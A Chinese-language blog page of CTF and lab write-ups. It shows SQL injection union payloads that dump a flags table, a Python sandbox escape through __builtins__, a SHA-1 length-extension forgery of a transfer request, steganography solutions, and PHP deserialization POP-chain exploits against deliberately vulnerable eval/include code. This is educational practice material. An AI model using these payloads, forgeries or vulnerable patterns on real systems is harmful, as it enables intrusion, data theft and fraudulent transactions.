<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload =&quot;Mina&#x27; or 1=1#&quot;.encode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;error&quot;,&quot;message&quot;:&quot;Invalid text signature, this incident will be reported!&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;signature&quot;:&quot;dummy&quot;,&quot;text&quot;:&quot;TWluYScgb3IgMT0xIw==&quot;&#125;,&quot;steps&quot;:[&quot;Decoded text from base64 ✅&quot;,&quot;Selected query #0 ✅&quot;],&quot;compare&quot;:&quot;114f7d67521c76794935ed8146367e62b19ef8bf !== dummy&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;query&quot;:&quot;SELECT * FROM users WHERE users.name=&#x27;Mina&#x27; or 1=1#&#x27;&quot;,&quot;results&quot;:[&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Branko&quot;,&quot;surname&quot;:&quot;Cakarmish&quot;,&quot;age&quot;:19&#125;,&#123;&quot;id&quot;:2,&quot;name&quot;:&quot;Lara&quot;,&quot;surname&quot;:&quot;Dragar&quot;,&quot;age&quot;:28&#125;,&#123;&quot;id&quot;:3,&quot;name&quot;:&quot;Lavon&quot;,&quot;surname&quot;:&quot;Tromp&quot;,&quot;age&quot;:18&#125;,&#123;&quot;id&quot;:4,&quot;name&quot;:&quot;Randal&quot;,&quot;surname&quot;:&quot;Jacobson&quot;,&quot;age&quot;:29&#125;,&#123;&quot;id&quot;:5,&quot;name&quot;:&quot;Mina&quot;,&quot;surname&quot;:&quot;Lang&quot;,&quot;age&quot;:29&#125;,&#123;&quot;id&quot;:6,&quot;name&quot;:&quot;Willis&quot;,&quot;surname&quot;:&quot;Little&quot;,&quot;age&quot;:34&#125;,&#123;&quot;id&quot;:7,&quot;name&quot;:&quot;Haley&quot;,&quot;surname&quot;:&quot;Boyle&quot;,&quot;age&quot;:51&#125;,&#123;&quot;id&quot;:8,&quot;name&quot;:&quot;Serena&quot;,&quot;surname&quot;:&quot;Kuhic&quot;,&quot;age&quot;:21&#125;,&#123;&quot;id&quot;:9,&quot;name&quot;:&quot;Chance&quot;,&quot;surname&quot;:&quot;Doyle&quot;,&quot;age&quot;:34&#125;,&#123;&quot;id&quot;:10,&quot;name&quot;:&quot;Izaiah&quot;,&quot;surname&quot;:&quot;Kuvalis&quot;,&quot;age&quot;:19&#125;,&#123;&quot;id&quot;:11,&quot;name&quot;:&quot;Ramiro&quot;,&quot;surname&quot;:&quot;Sporer&quot;,&quot;age&quot;:21&#125;,&#123;&quot;id&quot;:12,&quot;name&quot;:&quot;Cleora&quot;,&quot;surname&quot;:&quot;Turner&quot;,&quot;age&quot;:38&#125;,&#123;&quot;id&quot;:13,&quot;name&quot;:&quot;Alexa&quot;,&quot;surname&quot;:&quot;Kovacek&quot;,&quot;age&quot;:47&#125;,&#123;&quot;id&quot;:14,&quot;name&quot;:&quot;Okey&quot;,&quot;surname&quot;:&quot;Kunze&quot;,&quot;age&quot;:53&#125;,&#123;&quot;id&quot;:15,&quot;name&quot;:&quot;Shane&quot;,&quot;surname&quot;:&quot;Walsh&quot;,&quot;age&quot;:46&#125;,&#123;&quot;id&quot;:16,&quot;name&quot;:&quot;Vanessa&quot;,&quot;surname&quot;:&quot;Reichel&quot;,&quot;age&quot;:31&#125;,&#123;&quot;id&quot;:17,&quot;name&quot;:&quot;Enrico&quot;,&quot;surname&quot;:&quot;Bernier&quot;,&quot;age&quot;:55&#125;,&#123;&quot;id&quot;:18,&quot;name&quot;:&quot;Maybelle&quot;,&quot;surname&quot;:&quot;Hickle&quot;,&quot;age&quot;:32&#125;,&#123;&quot;id&quot;:19,&quot;name&quot;:&quot;Garry&quot;,&quot;surname&quot;:&quot;Carter&quot;,&quot;age&quot;:37&#125;,&#123;&quot;id&quot;:20,&quot;name&quot;:&quot;Amanda&quot;,&quot;surname&quot;:&quot;Deckow&quot;,&quot;age&quot;:17&#125;,&#123;&quot;id&quot;:21,&quot;name&quot;:&quot;Aron&quot;,&quot;surname&quot;:&quot;Greenholt&quot;,&quot;age&quot;:34&#125;,&#123;&quot;id&quot;:22,&quot;name&quot;:&quot;Garrett&quot;,&quot;surname&quot;:&quot;Dubuque&quot;,&quot;age&quot;:41&#125;,&#123;&quot;id&quot;:23,&quot;name&quot;:&quot;Mozelle&quot;,&quot;surname&quot;:&quot;Schamberger&quot;,&quot;age&quot;:45&#125;,&#123;&quot;id&quot;:24,&quot;name&quot;:&quot;Arno&quot;,&quot;surname&quot;:&quot;Mckenzie&quot;,&quot;age&quot;:25&#125;,&#123;&quot;id&quot;:25,&quot;name&quot;:&quot;Claudie&quot;,&quot;surname&quot;:&quot;Lowe&quot;,&quot;age&quot;:17&#125;,&#123;&quot;id&quot;:26,&quot;name&quot;:&quot;Janice&quot;,&quot;surname&quot;:&quot;Bogisich&quot;,&quot;age&quot;:30&#125;,&#123;&quot;id&quot;:27,&quot;name&quot;:&quot;Kenneth&quot;,&quot;surname&quot;:&quot;Dicki&quot;,&quot;age&quot;:47&#125;],&quot;description&quot;:&quot;This query selects all users with the name &#x27;Mina&#x27; or 1=1#&#x27;.&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;signature&quot;:&quot;114f7d67521c76794935ed8146367e62b19ef8bf&quot;,&quot;text&quot;:&quot;TWluYScgb3IgMT0xIw==&quot;&#125;,&quot;steps&quot;:[&quot;Decoded text from base64 ✅&quot;,&quot;Selected query #0 ✅&quot;,&quot;Confirmed text and signature match ✅&quot;,&quot;Executed query ✅&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>成功绕过过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload =&quot;&#x27;union select 1,2,3,4 from users# &quot;.encode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;2&quot;,&quot;surname&quot;:&quot;3&quot;,&quot;age&quot;:4&#125;</span><br></pre></td></tr></table></figure>
<p>得到存在4个字段，回显点为4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =&quot;&#x27;union select 1,2,3,version()# &quot;.encode(&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure>
<p>成功回显，按照正常sql注入流程注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">得到表名</span><br><span class="line">age&quot;:&quot;cars,flags,users&quot;</span><br></pre></td></tr></table></figure>
<p>得到字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag,id</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,flag from flags #</span><br></pre></td></tr></table></figure>
<h2 id="SAFE-SPACE"><a href="#SAFE-SPACE" class="headerlink" title="SAFE SPACE"></a>SAFE SPACE</h2><p>题目提供了端口，访问端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 51.124.222.205 13379</span><br></pre></td></tr></table></figure>
<p>python sandbox escape问题，禁用了很多函数，但自带的<code>__builtins__</code>能够使用，使用内置list索引访问绕过过滤，获得flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;__builtins__</span><br><span class="line">&#123;&#x27;open&#x27;: &lt;built-in function open&gt;, &#x27;print&#x27;: &lt;built-in function print&gt;, &#x27;list&#x27;: &lt;class &#x27;list&#x27;&gt;, &#x27;FILE&#x27;: &#x27;flag.txt&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt;FILE</span><br><span class="line">flag.txt</span><br><span class="line">&gt;&gt;&gt;open(FILE).read()</span><br><span class="line">Yeah no.</span><br><span class="line">&gt;&gt;&gt;list(__builtins__.values())[0](FILE).read()</span><br><span class="line">dctf&#123;bur5t_y0ur_bubbl3&#125;</span><br></pre></td></tr></table></figure>
<h1 id="sha-1利用demo"><a href="#sha-1利用demo" class="headerlink" title="sha-1利用demo"></a>sha-1利用demo</h1><p>api接口参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from=123&amp;to=456&amp;amount=50</span><br></pre></td></tr></table></figure>
<p>服务器检测函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$salt = &quot;s3cRe7-#!@~&quot;;</span><br><span class="line">$signature = sha1($salt.$msg);</span><br><span class="line">if($signature == $x_signature_header) &#123; // sent as an HTTP header</span><br><span class="line">	// correct</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	// discard message</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>服务器生成hash生成函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* PHP */</span><br><span class="line">$salt = &quot;s3cRe7-#!@~&quot;;</span><br><span class="line">$msg = urldecode($_SERVER[&#x27;QUERY_STRING&#x27;]); // read input.</span><br><span class="line"></span><br><span class="line">$signature = sha1($salt . $msg);    // compute signature.</span><br></pre></td></tr></table></figure>
<p>传递的信息加在salt后进行hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">73 33 63 52 65 37 2d 23 21 40 7e 66 72 6f 6d 3d    s3cRe7-#!@~from=</span><br><span class="line">31 32 33 26 74 6f 3d 34 35 36 26 61 6d 6f 75 6e    123&amp;to=456&amp;amoun</span><br><span class="line">74 3d 35 30 80 00 00 00 00 00 00 00 00 00 00 00     t=50............</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 20     ............... </span><br></pre></td></tr></table></figure>
<p>假设我们得知了salt的长度，就可以获得恶意代码的hash值注入到服务器中。<br>sha1的最后两字节是块中字符的长度，我们构造第二个数据块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">26 74 6f 3d 36 36 36 26 61 6d 6f 75 6e 74 3d 39    &amp;to=666&amp;amount=9</span><br><span class="line">39 39 39 39 80 00 00 00 00 00 00 00 00 00 00 00    9999............</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 a0    ................</span><br></pre></td></tr></table></figure>
<p>第一个数据块使用固定的初始字符组加密，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0</span><br><span class="line">sha1(“s3cRe7-#!@~from=123&amp;to=456&amp;amount=50”)</span><br><span class="line">= “18d2fccddeba1b08304fb53e849be5711d55b2e0&quot;</span><br></pre></td></tr></table></figure>

<p>后面的每一个字符串都是通过前一个数据块的结果进行加密<br>因此数据块2的加密密钥就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x18d2fccd, 0xdeba1b08, 0x304fb53e, 0x849be571, 0x1d55b2e0)</span><br></pre></td></tr></table></figure>
<p>构造复合的数据块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">66 72 6f 6d 3d 31 32 33 26 74 6f 3d 34 35 36 26    from=123&amp;to=456&amp;</span><br><span class="line">61 6d 6f 75 6e 74 3d 35 30 80 00 00 00 00 00 00    amount=50.......</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................</span><br><span class="line">00 00 00 01 20 26 74 6f 3d 36 36 36 26 61 6d 6f    .... &amp;to=666&amp;amo</span><br><span class="line">75 6e 74 3d 39 39 39 39 39                         unt=99999  </span><br></pre></td></tr></table></figure>
<p>因为我们已知存在11长度的salt，将数据块向前移11位<br>得到新的hash值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5a77fe8376811dbf7533509cceb6c8c53f98e253</span><br></pre></td></tr></table></figure>
<p>而这个值正好是我们后续加上的块2的sha1值，因此我们成功绕过了salt拿到传输数据的hash值。<br>得到flag。</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>打开<br><img src=".%5Cb56cde4f-be03-4d07-a0ca-6af22284f0aa.jpg" alt="b56cde4f-be03-4d07-a0ca-6af22284f0aa.jpg"><br>没什么特殊的，winhex打开得到flag</p>
<p><img src=".%5C%E6%8D%95%E8%8E%B7.PNG" alt="捕获.PNG"></p>
<h2 id="lsb"><a href="#lsb" class="headerlink" title="lsb"></a>lsb</h2><p>使用stegsolve打开，</p>
<p><img src=".%5C2.PNG" alt="2.PNG"><br>可以看到明显的0通道更改<br>使用lsb更改<br>没有立即发下flag或者文字信息，但看到了png头。</p>
<p><img src=".%5C3.PNG" alt="3.PNG"></p>
<p>save bin保存为png<br>得到二维码</p>
<p><img src=".%5C1.png" alt="1.png"><br>得到flag<br>cumtctf{1sb_i4_s0_Ea4y}</p>
<h2 id="镜中世界"><a href="#镜中世界" class="headerlink" title="镜中世界"></a>镜中世界</h2><p><img src=".%5Csteg.png" alt="steg.png"></p>
<p>提示使用steg<br>在red0通道中发现了信息</p>
<p><img src=".%5C4.PNG" alt="4.PNG"></p>
<p>考虑lsb<br>得到flag</p>
<p><img src=".%5C5.PNG" alt="5.PNG"><br>  Hey I th ink we c<br>616e207772697465 20736166656c7920  an write  safely<br>696e207468697320 66696c6520776974  in this  file wit<br>686f757420616e79 6f6e652073656569  hout any one seei<br>6e672069742e2041 6e797761792c2074  ng it. A nyway, t<br>6865207365637265 74206b6579206973  he secre t key is<br>3a2073743367305f 7361757275735f77  : st3g0_ saurus_w<br>7233636b73000000 0000000000000000  r3cks</p>
<h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>题目要求寻找后门<br>尝试使用gerp命令，但找到的eval后门不是目标。<br>使用D盾扫面，发现目标大马</p>
<p><img src=".%5Ca.PNG" alt="a.PNG"></p>
<p><img src=".%5Cc.PNG" alt="c.PNG"></p>
<p>得到falg</p>
<h2 id="DEMO2"><a href="#DEMO2" class="headerlink" title="DEMO2"></a>DEMO2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">&#x27;demo2.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">&quot;demo2.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;文件&quot;</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj=<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;这是f2的析构函数&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;这是f3的析构函数&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">		unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>poc<br>test3：eval任意命令执行-&gt;test2:__tostring调用execute方法-&gt;test1:对象转化为字符串调用test2：__tostring</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> test2();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;varr=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;obj=<span class="keyword">new</span> test3();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$o</span> = <span class="keyword">new</span> test1();</span><br><span class="line">	<span class="variable">$s</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">	<span class="keyword">echo</span> urlencode(<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">//O%3A5%3A%22test1%22%3A1%3A%7Bs%3A4%3A%22varr%22%3BO%3A5%3A%22test2%22%3A2%3A%7Bs%3A4%3A%22varr%22%3Bs%3A6%3A%22123456%22%3Bs%3A3%3A%22obj%22%3BO%3A5%3A%22test3%22%3A1%3A%7Bs%3A4%3A%22varr%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/11/4-13/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/11/4-13/" class="post-title-link" itemprop="url">4-13</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-11 19:51:47" itemprop="dateCreated datePublished" datetime="2022-04-11T19:51:47+08:00">2022-04-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-27 14:35:32" itemprop="dateModified" datetime="2022-04-27T14:35:32+08:00">2022-04-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h2 id="webserialize"><a href="#webserialize" class="headerlink" title="webserialize"></a>webserialize</h2><h3 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h3><p>demo源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;demo3.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;demo3.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__invoke()</code>函数：在对象以函数方式调用时，自动调用此方法</p>
<p><code>__get()</code>读取不可访问属性*(受保护的属性)*的值时，__get() 会被调用</p>
